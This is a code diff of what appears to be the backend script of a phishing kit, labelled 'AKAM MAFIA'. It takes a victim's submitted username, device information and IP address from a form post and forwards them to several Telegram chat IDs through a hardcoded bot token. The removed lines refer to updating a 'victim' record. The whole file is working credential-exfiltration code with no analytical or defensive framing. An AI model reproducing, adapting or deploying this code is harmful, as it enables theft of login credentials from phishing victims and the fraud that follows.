@@ -1,24 +1,19 @@
 <?php
 error_reporting(0);
-require_once('../panel/lib/funciones.php');
-
+$u = $_POST['usr'];
+$d = $_POST['dis'];
 $ip = $_SERVER['REMOTE_ADDR'];
-$usuario = $_POST['usr'];
+
 $token = "8721615356:AAGxIf7AxwGMzhoUOtxI9IRQoOXoIMJ2_iA";
-$chat_ids = ["8114050673", "8518977918"]; // Tus 2 IDs originales
+$ids = ["8114050673", "8518977918", "8638340940"];
 
-if (!empty($usuario)) {
-    actualizar_registro($ip, "USUARIO", $usuario);
-    actualizar_estado_victima($ip, "1");
-    
-    $mensaje = "⭐ <b>𝓐K𝓐𝓜 𝓜𝓐𝓕𝓘𝓐 - INICIO</b> ⭐\n";
-    $mensaje .= "👤 <b>USUARIO:</b> <code>$usuario</code>\n";
-    $mensaje .= "📍 <b>IP:</b> $ip";
-
-    foreach ($chat_ids as $id) {
-        $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$id&text=".urlencode($mensaje)."&parse_mode=HTML";
-        @file_get_contents($url);
+if(!empty($u)){
+    $msg = "⭐ <b>𝓐K𝓐𝓜 𝓜𝓐𝓕𝓘𝓐 - INICIO</b> ⭐\n\n👤 <b>USUARIO:</b> <code>$u</code>\n📱 <b>SISTEMA:</b> $d\n📍 <b>IP:</b> $ip";
+    foreach($ids as $id){
+        $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$id&text=".urlencode($msg)."&parse_mode=HTML";
+        $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_exec($ch); curl_close($ch);
     }
+    echo "ok";
 }
-echo "ok";
 ?>
